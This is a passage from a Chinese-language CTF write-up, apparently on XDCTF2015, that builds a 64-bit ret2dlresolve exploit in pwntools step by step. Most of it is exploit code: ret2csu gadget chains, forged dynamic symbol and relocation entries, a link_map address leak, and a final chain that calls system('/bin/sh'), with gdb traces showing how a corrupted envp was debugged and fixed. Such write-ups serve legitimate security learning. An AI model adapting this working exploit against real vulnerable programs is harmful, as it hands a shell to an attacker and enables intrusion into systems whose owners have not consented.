<span class="token comment" spellcheck="true"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
resolve_data<span class="token punctuation">,</span> resolve_call <span class="token operator">=</span> ret2dlresolve_x64<span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>store_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send resolve data</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>

rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span>
bin_sh_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bin_sh_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># leak link_map addr</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x601008</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
link_map_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>link_map_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>link_map_addr<span class="token operator">+</span><span class="token number">0x1c8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x00000000004007a3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x00000000004007a3: pop rdi; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>resolve_call<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># rop.raw('a'*(256-len(rop.chain())))</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然鹅，还是崩溃。但这次比较好的是，确实已经执行到了 system 函数。通过调试，我们可以发现，system 函数在进一步调用 execve 时出现了问题</p>
<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f7f3f74d3ec <do_system+1180>       call   execve <execve>
        path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7ffe636770a8 ◂— 0x10000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p>
<p>首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400780</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40079A</span>
vuln_addr <span class="token operator">=</span> <span class="token number">0x400637</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">ret2dlresolve_x64</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> func_name<span class="token punctuation">,</span> resolve_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rela.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    relaent <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_RELAENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># reloc entry size</span>

    dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    syment <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_SYMENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># symbol entry size</span>

    dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr


    <span class="token comment" spellcheck="true"># construct fake function string</span>
    func_string_addr <span class="token operator">=</span> store_addr
    resolve_data <span class="token operator">=</span> func_name <span class="token operator">+</span> <span class="token string">"\x00"</span>

    <span class="token comment" spellcheck="true"># construct fake symbol</span>
    symbol_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> symbol_addr <span class="token operator">-</span> dynsym
    pad <span class="token operator">=</span> syment <span class="token operator">-</span> offset <span class="token operator">%</span> syment <span class="token comment" spellcheck="true"># align syment size</span>
    symbol_addr <span class="token operator">=</span> symbol_addr<span class="token operator">+</span>pad
    symbol <span class="token operator">=</span> p32<span class="token punctuation">(</span>func_string_addr<span class="token operator">-</span>dynstr<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    symbol_index <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span> symbol

    <span class="token comment" spellcheck="true"># construct fake reloc </span>
    reloc_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> reloc_addr <span class="token operator">-</span> rel_plt
    pad <span class="token operator">=</span> relaent <span class="token operator">-</span> offset <span class="token operator">%</span> relaent <span class="token comment" spellcheck="true"># align relaent size</span>
    reloc_addr <span class="token operator">+=</span>pad
    reloc_index <span class="token operator">=</span> <span class="token punctuation">(</span>reloc_addr<span class="token operator">-</span>rel_plt<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    rinfo <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_index<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7</span>
    write_reloc <span class="token operator">=</span> p64<span class="token punctuation">(</span>resolve_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rinfo<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span>write_reloc

    resolve_call <span class="token operator">=</span> p64<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>reloc_index<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resolve_data<span class="token punctuation">,</span> resolve_call


io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

store_addr <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span>

<span class="token comment" spellcheck="true"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
resolve_data<span class="token punctuation">,</span> resolve_call <span class="token operator">=</span> ret2dlresolve_x64<span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>store_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send resolve data</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resolve_data<span class="token operator">+</span>sh<span class="token punctuation">)</span>
bin_sh_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># rop = ROP("./main_partial_relro_64")</span>
<span class="token comment" spellcheck="true"># rop.raw(offset*'a')</span>
<span class="token comment" spellcheck="true"># sh = "/bin/sh\x00"</span>
<span class="token comment" spellcheck="true"># bin_sh_addr = store_addr+len(resolve_data)</span>
<span class="token comment" spellcheck="true"># rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))</span>
<span class="token comment" spellcheck="true"># rop.raw(vuln_addr)</span>
<span class="token comment" spellcheck="true"># rop.raw("a"*(256-len(rop.chain())))</span>
<span class="token comment" spellcheck="true"># io.send(rop.chain())</span>
<span class="token comment" spellcheck="true"># io.send(sh)</span>


<span class="token comment" spellcheck="true"># leak link_map addr</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x601008</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
link_map_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>link_map_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>link_map_addr<span class="token operator">+</span><span class="token number">0x1c8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x00000000004007a3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x00000000004007a3: pop rdi; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>resolve_call<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># rop.raw('a'*(256-len(rop.chain())))</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这时，再次尝试一下，发现</p>
<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f5a187703ec <do_system+1180>       call   execve <execve>
        path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7fff68270538 ◂— 0x6161616100000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 ‘a’。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400780</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40079A</span>
vuln_addr <span class="token operator">=</span> <span class="token number">0x400637</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
